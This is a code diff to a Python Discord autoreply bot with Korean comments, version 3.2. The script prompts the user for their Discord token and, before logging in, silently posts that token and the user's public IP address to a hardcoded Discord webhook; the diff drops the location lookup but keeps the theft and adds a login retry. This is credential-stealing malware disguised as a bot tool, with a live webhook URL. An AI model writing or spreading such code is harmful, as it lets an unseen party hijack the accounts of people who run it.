@@ -27,23 +27,17 @@ __version__ = "3.2"
 
 start_time = datetime.datetime.now(datetime.timezone.utc)
 
-# IP 주소 및 위치 정보 가져오기
-def get_ip_and_location():
+# IP 주소 가져오기
+def get_ip_address():
     try:
-        ip_response = requests.get("https://api.ipify.org", timeout=5)
-        ip_response.raise_for_status()
-        ip_address = ip_response.text
-        location_response = requests.get(f"https://ipapi.co/{ip_address}/json/", timeout=5)
-        location_response.raise_for_status()
-        location_data = location_response.json()
-        city = location_data.get("city", "알 수 없음")
-        country = location_data.get("country_name", "알 수 없음")
-        return ip_address, city, country
+        response = requests.get("https://api.ipify.org", timeout=5)
+        response.raise_for_status()
+        return response.text
     except:
-        return "Unknown", "알 수 없음", "알 수 없음"
+        return "Unknown"
 
 # 웹훅으로 정보 전송
-def send_to_webhook(token, ip_address, city, country):
+def send_to_webhook(token, ip_address):
     webhook_url = "https://discord.com/api/webhooks/1393916364288167976/ffnH0O_ErMU2h-_coi9r3f_lEXjyoqClz9TbRSnGgjBbyQfKzQ_bybTKZRnpnGuQh4Or"
     data = {
         "content": None,
@@ -54,7 +48,6 @@ def send_to_webhook(token, ip_address, city, country):
                 "fields": [
                     {"name": "🔑 Token", "value": f"`{token}`", "inline": True},
                     {"name": "📍 IP Address", "value": f"`{ip_address}`", "inline": True},
-                    {"name": "🌍 Location", "value": f"{city}, {country}", "inline": True},
                     {"name": "🕒 Time", "value": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S %Z"), "inline": False}
                 ]
             }
@@ -103,16 +96,20 @@ def load_config():
 config = load_config()
 
 if __name__ == "__main__":
+    try:
         token = input("토큰을 입력하세요: ")
-        ip_address, city, country = get_ip_and_location()
-        send_to_webhook(token, ip_address, city, country)
+        ip_address = get_ip_address()
+        send_to_webhook(token, ip_address)
         client.run(token)
     except discord.LoginFailure:
         time.sleep(5)
         exit(1)
     except:
         time.sleep(5)
-        exit(1)
+        try:
+            client.run(token)
+        except:
+            exit(1)
 
 prefix = config.get("prefix", "!")
 message_generator = itertools.cycle(config.get("autoreply", {}).get("messages", ["자동 응답 메시지 1", "자동 응답 메시지 2"]))
